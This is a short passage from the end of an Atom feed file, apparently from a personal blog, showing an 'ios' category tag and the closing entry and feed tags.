      <category term="ios" scheme="http://finsenty54.github.io/tags/ios/"/>
    
  </entry>
  
</feed>
